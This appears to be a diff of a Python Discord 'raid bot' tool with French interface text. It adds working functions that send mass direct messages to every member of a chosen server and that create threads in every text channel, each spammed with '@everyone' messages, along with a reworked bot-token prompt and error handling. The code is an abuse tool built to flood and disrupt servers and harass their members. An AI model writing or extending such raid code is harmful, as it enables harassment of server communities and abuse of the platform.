+        text_channels = len([c for c in guild.channels if isinstance(c, discord.TextChannel)])
+        voice_channels = len([c for c in guild.channels if isinstance(c, discord.VoiceChannel)])
+        categories = len([c for c in guild.channels if isinstance(c, discord.CategoryChannel)])
+        
+        print(Fore.RED + f"Salons texte: {text_channels}")
+        print(Fore.RED + f"Salons vocaux: {voice_channels}")
+        print(Fore.RED + f"Categories: {categories}")
+        
+        # Permissions du bot
+        bot_member = guild.get_member(self.user.id)
+        if bot_member:
+            perms = bot_member.guild_permissions
+            print(Fore.RED + f"Admin bot: {'Oui' if perms.administrator else 'Non'}")
+            print(Fore.RED + f"Gerer serveur: {'Oui' if perms.manage_guild else 'Non'}")
+            print(Fore.RED + f"Bannir membres: {'Oui' if perms.ban_members else 'Non'}")
+            print(Fore.RED + f"Kicker membres: {'Oui' if perms.kick_members else 'Non'}")
+        
+        print()
+        input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+    async def mass_dm_custom(self):
+        """Envoie des DM personnalisés avec différents messages"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + "=== MESSAGES PRIVES PERSONNALISES ===")
+
+        try:
+            messages = input(Fore.RED + "Messages (separes par '|') ou 'b': ").strip()
+            if messages.lower() == 'b':
+                return
+                
+            if not messages:
+                print(Fore.RED + "Aucun message fourni!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            message_list = [msg.strip() for msg in messages.split('|') if msg.strip()]
+            
+            members = [member for member in self.selected_guild.members 
+                      if not member.bot and member != self.user]
+
+            if not members:
+                print(Fore.RED + "Aucun membre trouve!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Envoi de messages varies a {len(members)} membres...")
+
+            sent = 0
+            import random
+            
+            for member in members:
+                try:
+                    # Choisir un message au hasard
+                    random_message = random.choice(message_list)
+                    await member.send(random_message)
+                    sent += 1
+                    print(Fore.RED + f"Message envoye a {member.display_name}")
+                    await asyncio.sleep(0.5)
+                except Exception as e:
+                    print(Fore.RED + f"Erreur pour {member.display_name}: {e}")
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"✅ {sent}/{len(members)} messages envoyes!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+        except Exception as e:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Erreur: {e}")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+    async def spam_threads(self):
+        """Crée des threads de spam dans tous les salons"""
+        if not self.selected_guild:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + "Aucun serveur selectionne!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
+        clear_screen()
+        await show_ascii()
+        
+        text_channels = [channel for channel in self.selected_guild.channels 
+                        if isinstance(channel, discord.TextChannel)]
+
+        if not text_channels:
+            print(Fore.RED + "Aucun salon texte trouve!")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+            return
+
+        try:
+            thread_name = input(Fore.RED + "Nom des threads ou 'b': ").strip()
+            if thread_name.lower() == 'b':
+                return
+            if not thread_name:
+                thread_name = "spam-thread"
+
+            message = input(Fore.RED + "Message a spammer dans les threads ou 'b': ").strip()
+            if message.lower() == 'b':
+                return
+            if not message:
+                message = "SPAM!"
+
+            count_str = input(Fore.RED + "Messages par thread (1-20) ou 'b': ").strip()
+            if count_str.lower() == 'b':
+                return
+            try:
+                count = int(count_str)
+                if not (1 <= count <= 20):
+                    print(Fore.RED + "Nombre invalide!")
+                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                    return
+            except ValueError:
+                print(Fore.RED + "Nombre invalide!")
+                input(Fore.RED + "Appuyez sur Entree pour continuer...")
+                return
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Creation de threads dans {len(text_channels)} salons...")
+
+            created_threads = 0
+            total_messages = 0
+
+            for channel in text_channels:
+                try:
+                    # Envoyer un message initial pour créer le thread
+                    initial_msg = await channel.send("Thread creation...")
+                    
+                    # Créer le thread
+                    thread = await initial_msg.create_thread(
+                        name=thread_name,
+                        reason="Thread spam command"
+                    )
+                    created_threads += 1
+                    
+                    # Spammer dans le thread
+                    for i in range(count):
+                        try:
+                            await thread.send(f"@everyone {message}")
+                            total_messages += 1
+                            await asyncio.sleep(0.3)
+                        except:
+                            break
+                    
+                    print(Fore.RED + f"Thread cree dans #{channel.name}")
+                    
+                except Exception as e:
+                    print(Fore.RED + f"Erreur dans #{channel.name}: {e}")
+
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"✅ Threads crees: {created_threads}")
+            print(Fore.RED + f"✅ Messages envoyes: {total_messages}")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+        except Exception as e:
+            clear_screen()
+            await show_ascii()
+            print(Fore.RED + f"Erreur: {e}")
+            input(Fore.RED + "Appuyez sur Entree pour continuer...")
+
+async def get_token():
     """Demande le token à l'utilisateur avec animation"""
     clear_screen()
-    loading_animation("Initialisation du raid bot", 0.4)
+    await loading_animation("Initialisation du raid bot", 0.01)
     clear_screen()
-    show_ascii()
-    typing_effect("raid bot tools", 0.02)
-    time.sleep(0.1)
-    typing_effect("Entrez le token de votre bot Discord:", 0.01)
+    await show_ascii()
+    await typing_effect("raid bot tools", 0.0001)
+    await asyncio.sleep(0.001)
+    await typing_effect("Entrez le token de votre bot Discord:", 0.0001)
+    print()
+    print(Fore.RED + "⚠️  IMPORTANT: Gardez votre token secret!")
+    print(Fore.RED + "   Ne le partagez jamais avec personne.")
+    print()
 
-    token = input(Fore.RED + "Token: ")
-    return token.strip()
+    try:
+        # Utiliser getpass pour masquer le token et éviter de bloquer l'event loop
+        token = await asyncio.to_thread(getpass.getpass, Fore.RED + "Token: ")
+        return token.strip()
+    except KeyboardInterrupt:
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + "\n⚠️  Saisie annulée par l'utilisateur.")
+        return None
+    except Exception as e:
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + f"❌ Erreur lors de la saisie: {e}")
+        return None
 
 async def main():
-    token = get_token()
+    token = await get_token()
 
     if not token:
+        clear_screen()
+        await show_ascii()
         print(Fore.RED + "❌ Aucun token fourni!")
+        print(Fore.RED + "Veuillez entrer un token Discord valide.")
+        return
+
+    # Validation basique du token
+    if len(token) < 50 or not token.replace('.', '').replace('-', '').replace('_', '').isalnum():
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + "❌ Token invalide! Le format ne correspond pas a un token Discord.")
+        print(Fore.RED + "Un token Discord doit contenir au moins 50 caracteres alphanumeriques.")
         return
 
     intents = discord.Intents.default()
     intents.members = True
     intents.guilds = True
+    intents.message_content = True  # Requis pour les bots modernes
     bot = DiscordBot(intents=intents)
 
     try:
         clear_screen()
-        show_ascii()
+        await show_ascii()
         print(Fore.RED + "Demarrage du bot...")
+        print(Fore.RED + "Connexion a Discord en cours...")
         await bot.start(token)
     except discord.LoginFailure:
         clear_screen()
-        show_ascii()
-        print(Fore.RED + "Token invalide! Verifiez votre token Discord.")
+        await show_ascii()
+        print(Fore.RED + "❌ Token invalide! Verification echouee.")
+        print(Fore.RED + "Conseils:")
+        print(Fore.RED + "1. Verifiez que le token est correct")
+        print(Fore.RED + "2. Assurez-vous que le bot est active sur Discord")
+        print(Fore.RED + "3. Verifiez les permissions du bot")
     except discord.HTTPException as e:
-        print(Fore.RED + f"❌ Erreur HTTP: {e}")
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + f"❌ Erreur de connexion: {e}")
+        print(Fore.RED + "Verifiez votre connexion internet et reessayez.")
+    except discord.PrivilegedIntentsRequired:
+        clear_screen()
+        await show_ascii()
+        print(Fore.RED + "❌ Erreur: Intents privilegies requis!")
+        print(Fore.RED + "Activez les intents dans le portail Discord Developer.")
     except Exception as e:
+        clear_screen()
+        await show_ascii()
         print(Fore.RED + f"❌ Erreur inattendue: {e}")
+        print(Fore.RED + "Redemarrez le bot si le probleme persiste.")
     finally:
-        if not bot.is_closed():
-            await bot.close() 
+        try:
+            if not bot.is_closed():
+                await bot.close()
+        except Exception:
+            pass 
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
         clear_screen()
-        show_ascii()
-        print(Fore.RED + "Arret du bot demande par l'utilisateur.")
-        print(Fore.RED + "Bot arrete proprement.")
+        print(Fore.RED + ASCII_ART_4)
+        print(Fore.RED + "\n⚠️  Interruption detectee (Ctrl+C)")
+        print(Fore.RED + "✅ Bot arrete proprement.")
+        print(Fore.RED + "Au revoir!")
+    except Exception as e:
+        clear_screen()
+        print(Fore.RED + ASCII_ART_4)
+        print(Fore.RED + f"❌ Erreur fatale: {e}")
+        print(Fore.RED + "Le bot a ete ferme de maniere inattendue.")
+        input(Fore.RED + "Appuyez sur Entree pour fermer...")
